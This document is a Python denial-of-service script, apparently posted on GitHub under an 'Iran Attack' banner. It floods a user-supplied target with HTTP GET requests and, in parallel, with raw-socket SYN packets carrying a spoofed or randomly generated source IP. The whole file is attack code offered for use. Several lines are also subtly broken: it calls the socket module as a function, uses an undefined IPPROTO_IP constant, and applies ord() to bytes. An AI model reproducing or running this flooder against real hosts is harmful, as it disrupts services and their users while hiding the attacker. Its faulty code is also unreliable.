from ast import Pass
from time import sleep
from requests import get as requests_get
from time import localtime, strftime
import threading
import socket
import random
from struct import pack
from socket import AF_INET, SOCK_RAW, IPPROTO_TCP, IP_HDRINCL, inet_aton, htons
from random import randint

def print_banner():
    print("\n██████╗░░█████╗░░██████╗████████╗██████╗░░█████╗░")
    print("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗")
    print("██║░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝███████║")
    print("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║")
    print("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║")
    print("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝")
    print("-------------------------------------------------")
    print("   ----| Iran Attack _ GitHub:@emnatkins |----   ")
    print("-------------------------------------------------\n\n")

def http_get_flood(target, packet_size):
    count = 0
    if packet_size == "u":
        print("===== The HTTP GET Flood attack started :)")
        while True:
            named_tuple = localtime() # get struct_time
            time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
            r = requests_get("http://"+target)
            print(f"[{time_string}] Packet was sent ({count})")
            count += 1
    elif int(packet_size) >= 1:
        print("===== The HTTP GET Flood attack started :)")
        while count <= int(packet_size):
            named_tuple = localtime() # get struct_time
            time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
            r = requests_get("http://"+target)
            print(f"[{time_string}] Packet was sent ({count})")
            count += 1
        print("HTTP GET Flood attack finished!")
    else:
        print("Error: Please enter the correct number of packets.")
        print("Note: The program closes automatically after 5 seconds!")
        sleep(5)

def checksum(psh):
    s = 0
    for i in range(0, len(psh), 2):
        w = (ord(psh[i]) << 8) + ord(psh[i+1])
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def syn_flood(target_ip, fake_ip):
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
    
    while True:
        source_ip = fake_ip
        dest_ip = target_ip
        ip_header = pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, IPPROTO_TCP, 0, inet_aton(source_ip), inet_aton(dest_ip))

        tcp_header = pack('!HHLLBBHHH', 12345, 80, 0, 0, 5 << 4, 2, htons(5840), 0, 0)

        psh = pack('!4s4sBBH', inet_aton(source_ip), inet_aton(dest_ip), 0, IPPROTO_TCP, len(tcp_header))
        psh = psh + tcp_header

        tcp_checksum = checksum(psh)
        tcp_header = pack('!HHLLBBHHH', 12345, 80, 0, 0, 5 << 4, 2, htons(5840), tcp_checksum, 0)

        packet = ip_header + tcp_header
        sock.sendto(packet, (target_ip, 0))

def main():
    print_banner()
    
    target = input("-- Target URL: ")
    packet_size = input("-- Packet Size (\"u\" = unlimited): ")
    fake_ip = input("-- Fake IP (or leave empty for auto-generate): ") or '.'.join([str(randint(0, 255)) for _ in range(4)])
    
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]
    
    # Check target
    try:
        requests_get("http://" + target)
    except:
        print("Error: Invalid site address.")
        sleep(5)
        return
    
    # Start HTTP GET Flood and SYN Flood attacks
    http_thread = threading.Thread(target=http_get_flood, args=(target, packet_size))
    syn_thread = threading.Thread(target=syn_flood, args=(target, fake_ip))
    
    http_thread.start()
    syn_thread.start()
    
    http_thread.join()
    syn_thread.join()

if __name__ == "__main__":
    main()